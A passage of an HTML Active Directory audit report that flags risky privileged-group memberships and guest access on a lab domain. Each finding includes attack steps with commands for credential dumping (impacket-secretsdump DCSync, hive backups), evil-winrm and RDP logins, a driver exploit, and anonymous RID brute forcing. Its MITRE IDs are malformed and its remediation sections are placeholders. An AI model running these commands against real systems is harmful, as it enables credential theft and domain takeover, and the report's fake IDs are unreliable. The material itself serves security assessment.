                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Print Operators group can log onto domain controllers and load malicious drivers to escalate privileges.</td>
                                        <td>T.134533</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>1</td></tr>
                                            <tr><td class="grey">Members</td><td>printoperator</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Print Operators group should be empty. Members can manage, create, share, and delete printers that are connected to domain controllers in the domain. Members of this group can logon locally and load and unload device drivers on all domain controllers in the domain as members are given the "SeLoadDriverPrivilege". An attacker could use these privileges to load a malicious driver on a domain controller and escalate privileges to fully compromise the domain.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/">Link 1</a></p>
                                            <p><a href="https://cybernetgen.com/abusing-seloaddriverprivilege-for-privilege-escalation/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Print Operators group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/printoperator-1.png" alt="Checking for members of print operators">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. This shows a user with no other privilege but a member of the "Print Operators" group having the "SeLoadDriverPrivilege" on a domain controller.</p>
                                                    <p class="code">whoami /all</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/accountoperator-2.png" alt="Checking SeLoadDriverPrivilege">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                            <div class="attack-text">
                                                <p>3. An attacker can use the "SeLoadDriverPrivilege to load a malicious driver and gain a SYSTEM command prompt on a domain controller, fully compromising the domain.</p>
                                                <p class="code">.\ExploitCapcom.exe</p>
                                            </div>
                                            <span class="image-cell">
                                                <img src="/Private/Report/Images/RBAC/printoperator-3.png" alt="Loading a malicious driver">
                                            </span>
                                        </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove uncessecary users from group</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Remote-Management-Users-group-does-not-meet-the-benchmark-(maximum-0-users)"><u>Remote Management Users group does not meet the benchmark (maximum 0 users)</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Remote Management Users group can remotely log into domain controllers.</td>
                                        <td>T.134533</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>1</td></tr>
                                            <tr><td class="grey">Members</td><td>remotemanagement</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The builtin Remote Management Users group permits members to connect remotely to domain controllers within the domain via WMI reousrves over WSMan protocols. By default domain admins can connect via WinRM to a domain controller, so do not need to be added. Access to domain controllers should be restricted to domain admins only.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#remote-management-users">Link 1</a></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/administration/server-manager/configure-remote-management-in-server-manager">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Remote Management Users group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/remotemanagement-1.png" alt="Checking for members of remote management users">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A user can simply connect to the domain controller via a remote management client and can an interactive session on the tier 0 device.</p>
                                                    <p class="code">evil-winrm -i dc.test.local -u remotemanagement -p Password123!</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/remotemanagement-2.png" alt="Logging in via WinRM">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove uncessecary users from group</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Backup-Operators-group-does-not-meet-the-benchmark-(maximum-0-users)"><u>Backup Operators group does not meet the benchmark (maximum 0 users)</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Backup Operators group can extract all credential information from domain controllers.</td>
                                        <td>T.134533</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>1</td></tr>
                                            <tr><td class="grey">Members</td><td>backupoperator</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Backup Operators group can backup and restore files and directories that are located on each domain controller in the domain. Users can therefore login and modify all files on a domain controller including credential information from the SAM and SYSTEM hives stored on domain controllers, giving effective domain admin privileges. Best practice is to keep the group empty in favour of a custom role-based group giving only the privileges required.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.bordergate.co.uk/backup-operator-privilege-escalation/">Link 1</a></p>
                                            <p><a href="https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Backup Operators group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/backupoperator-1.png" alt="Checking for members of backup operators">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. If a member, an attacker can perform a backup of the SAM, SYSTEM and SECURITY hives which store the local credential information on the domain controller.</p>
                                                    <p class="code">impacket-reg test.local/backupoperator:'Password123!'@dc.test.local backup -o '\\192.168.10.130\share'</p>
                                                    <p class="code">impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/backupoperator-2.png" alt="Extracting SAM and SYSTEM hive from domain controller">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. With the domain controller machine account hash obtained, this is sufficient to replicate the behavior of a domain controller and obtain all the user password hashes within the domain via a DCSync.</p>
                                                    <p class="code">impacket-secretsdump test.local/'DC$'@dc.test.local -hashes :89aca08404383706e09c9861dfee797e</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/backupoperator-3.png" alt="Performing a DCSync">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove uncessecary users from group</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Local-anonymous-access-is-permitted-allowing-anonymous-access-to-the-system"><u>Local anonymous access is permitted allowing anonymous access to the system</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>The guest account is enabled allowing unauthenticated access to domain resources.</td>
                                        <td>T-15940</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Account</td><td>CA.test.local\Guest</td></tr>
                                            <tr><td class="grey">Enabled</td><td>True</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Guest account is a default local account that has limited access to the computer and is disabled by default but will facilitate anonymous acces to domain resources if enabled. By default, the Guest account password is left blank which allows the Guest account to be accessed without requiring the user to enter a password. Attackers can then access file shares and remotely enumerate the domain from an unauthenticated standpoint.</p>
                                            <p>The BUILTIN Guest account is enabled, facilitating anonymous access to the local system..</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.trustedsec.com/blog/new-tool-release-rpc_enum-rid-cycling-attack">Link 1</a></p>
                                            <p><a href="https://www.whiteoaksecurity.com/blog/active-directory-security/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. An unauthenticated attacker can enumerate file shares on systems if the guest account is active, allowing them to crawl through company documeents for sensitive information.</p>
                                                    <p class="code">nxc smb dc.test.local -u anonymous -p '' --shares</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/anonymous-1.png" alt="Finding open shares">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. RID Cycling is a method that allows attackers to enumerate domain objects by bruteforcing or guessing RIDs and SIDs, based on the fact that RIDs are sequential. If the guest account is enabled facilitating read access to the IPC$ share on a domain controller, an unauthenticated attacker can enumerate all users and groups within the domain.</p>
                                                    <p class="code">nxc smb dc.test.local -u anonymous -p '' --rid-brute</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/anonymous-2.png" alt="RID brute">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove guest access</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Domain-anonymous-access-is-permitted-allowing-anonymous-access-to-the-domain"><u>Domain anonymous access is permitted allowing anonymous access to the domain</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>The guest account is enabled allowing unauthenticated access to domain resources.</td>
                                        <td>T-15940</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Account</td><td>CN=Guest,CN=Users,DC=test,DC=local</td></tr>
                                            <tr><td class="grey">Enabled</td><td>True</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Guest account is a default local account that has limited access to the computer and is disabled by default but will facilitate anonymous acces to domain resources if enabled. By default, the Guest account password is left blank which allows the Guest account to be accessed without requiring the user to enter a password. Attackers can then access file shares and remotely enumerate the domain from an unauthenticated standpoint.</p>
                                            <p>The domain Guest account is enabled, facilitating anonymous access to the domain..</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.trustedsec.com/blog/new-tool-release-rpc_enum-rid-cycling-attack">Link 1</a></p>
                                            <p><a href="https://www.whiteoaksecurity.com/blog/active-directory-security/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. An unauthenticated attacker can enumerate file shares on systems if the guest account is active, allowing them to crawl through company documeents for sensitive information.</p>
                                                    <p class="code">nxc smb dc.test.local -u anonymous -p '' --shares</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/anonymous-1.png" alt="Finding open shares">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. RID Cycling is a method that allows attackers to enumerate domain objects by bruteforcing or guessing RIDs and SIDs, based on the fact that RIDs are sequential. If the guest account is enabled facilitating read access to the IPC$ share on a domain controller, an unauthenticated attacker can enumerate all users and groups within the domain.</p>
                                                    <p class="code">nxc smb dc.test.local -u anonymous -p '' --rid-brute</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/anonymous-2.png" alt="RID brute">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove guest access</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Inactive/stale-accounts-are-not-disabled-in-privileged-groups"><u>Inactive/stale accounts are not disabled in privileged groups</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Accounts that have not logged on in the last 90 days are not disabled.</td>
                                        <td>T-15940</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>                                    <tr><td class="grey">Total privileged & inactive</td><td>3</td></tr>
                                    <tr><td class="grey">Users</td><td>enterpriseadmin1<br>enterpriseadmin2<br>domainadmin1</td></tr>
                                    <tr><td class="grey">Member of</td><td>CN=Enterprise Admins,CN=Users,DC=test,DC=local<br>CN=Enterprise Admins,CN=Users,DC=test,DC=local<br>CN=Domain Admins,CN=Users,DC=test,DC=local</td></tr>
                                    <tr><td class="grey">Enabled</td><td>True</td></tr>
                                    <tr><td class="grey">Inactivity period</td><td>90 days</td></tr>                                        </table></td>
                                        <td class="explanation">
                                            <p>Stale user accounts are a significant security issue, as former employees and external attackers could use those accounts to attack the organization. Good cyber security practice guides us to follow the principal of least privilege: if an account is not used, the account should be disabled or removed from privileged groups if it not required.</p>
                                            <p>3 privileged users have not logged in 90 days. A JML process should be enforced that disables accounts not used after a period of inactivity to prevent unauthorised use and conform to principle of least privilege. If a privilege is not required it should be removed.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/services-hub/unified/health/remediation-steps-ad/regularly-check-for-and-remove-inactive-user-accounts-in-active-directory">Link 1</a></p>
                                            <p><a href="https://www.lepide.com/blog/how-ad-inactive-accounts-harm-security/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Each user in Active Directory has a lastlogon attribute which can be used to identify stale and unused accounts.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/inactive.png" alt="Inactive accounts">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>JML process to disable inactive accounts</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Schema-Admins-group-does-not-meet-the-benchmark-(maximum-0-users)"><u>Schema Admins group does not meet the benchmark (maximum 0 users)</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Schema Admins group can add a backdoor or break the domain.</td>
                                        <td>T.134533</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>2</td></tr>
                                            <tr><td class="grey">Members</td><td>jack Administrator</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Schema Admins group permits members to modify the domain Schema and should be empty. This group is used when the directory Schema requires altering, for example when an application such as microsoft exchange requires installation. Once a modification has been performed, such as the creation of new objects, it cannot be undone and therefore unauthorised or accidental change can require a complete domain rebuild.</p>
                                            <p>Further, members of the group can add a backdoor to the schema structure that would provide an attacker full control of any group created after the schema modification.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://cube0x0.github.io/Pocing-Beyond-DA/ ">Link 1</a></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#schema-admins">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Schema Admins group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/schemaadmin-1.png" alt="Checking for members of schema admins">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. Members of the group can modify the schema, which can be viewed in the ADSI editor.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/schemaadmin-2.png" alt="Viewing the schema">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove uncessecary users from group</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Account-Operators-group-does-not-meet-the-benchmark-(maximum-0-users)"><u>Account Operators group does not meet the benchmark (maximum 0 users)</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Account Operators group are overly permissive and can log into domain controllers.</td>
                                        <td>T.134533</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>1</td></tr>
                                            <tr><td class="grey">Members</td><td>accountoperator</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Account Operators group should be empty as they can login locally to domain controllers. Account Operators are one privilege escalation vulnerability away from fully compromising the domain. Further, account operators have permission to delete all domain admin accounts except the default RID 500 "Administrator" account. Best practice is to keep the group empty in favour of a custom role-based group giving only the privileges required.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">Link 1</a></p>
                                            <p><a href="https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account in the Account Operators group, the attacker can log in locally to a domain controller (tier 0 asset).</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/accountoperator-1.png" alt="Logging into domain controller">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. This shows a user with no other privilege but a member of the "Account Operators" group having a command prompt on the domain controller. The user is a one privilege escalation vulnerability on the DC away from fully compromising the domain.</p>
                                                    <p class="code">whoami && hostname && net user accountoperator /domain</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/accountoperator-2.png" alt="Logging into domain controller">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove uncessecary users from group</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Enterprise-Admins-group-does-not-meet-the-benchmark-(maximum-0-users)"><u>Enterprise Admins group does not meet the benchmark (maximum 0 users)</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Too many users have full administrative control of the domain.</td>
                                        <td>T-15940</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>4</td></tr>
                                            <tr><td class="grey">Members</td><td>enterpriseadmin2 enterpriseadmin1 jack Administrator</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Enterprise Admins group gives full administrative privileges to all domains within a forest, offering a higher level of prvilege to domain admins. If the Active Directory consists of only one domain, this group is uneeded. Each domain should have seperate domain admin accounts and the enterprise admin group should not be used, to reduce the risk of lateral movement opportunities across domains.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#enterprise-admins">Link 1</a></p>
                                            <p><a href="">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any account in this group has full permission over all domain controllers within the domain, therefore a DCSync can be performed to extract all user credentials from the NTDS.dit stored within the domain controllers to fully compromise all users in the domain.</p>
                                                    <p class="code">impacket-secretsdump test.local/administrator:'Password123!'@dc.test.local -just-dc-ntlm</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/domain-enterprise-administrator.png" alt="Privileged accounts">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove uncessecary users from group</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="Remote-Desktop-Users-group-does-not-meet-the-benchmark-(maximum-0-users)"><u>Remote Desktop Users group does not meet the benchmark (maximum 0 users)</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Remote Desktop Users group can remotely log into domain controllers.</td>
                                        <td>T.134533</td>
                                        <td>+20</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>2</td></tr>
                                            <tr><td class="grey">Members</td><td>rdpuser serveroperator</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The builtin Remote Desktop Users group permits members to connect remotely to domain controllers within the domain. The Remote Desktop Users group should be empty as by default domain admins can RDP into a domain controller so do not need to be added. Access to domain controllers should be restricted to domain admins only.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#remote-desktop-users">Link 1</a></p>
                                            <p><a href="https://4sysops.com/archives/allow-non-admins-to-access-remote-desktop/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Remote Desktop Users group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/remotedesktop-1.png" alt="Checking for members of remote desktop users">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A user can simply connect to the domain controller via a remote desktop client and can an interactive session on the tier 0 device.</p>
                                                    <p class="code">xfreerdp /u:rdpuser /p:'Password123!' /d:test.local /v:dc.test.local /cert-ignore /dynamic-resolution</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/remotedesktop-2.png" alt="Logging in via RDP">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove uncessecary users from group</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="DnsAdmins-group-does-not-meet-the-benchmark-(maximum-0-users)"><u>DnsAdmins group does not meet the benchmark (maximum 0 users)</u></td>
                    <td class="finding-riskHIGH">HIGH</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
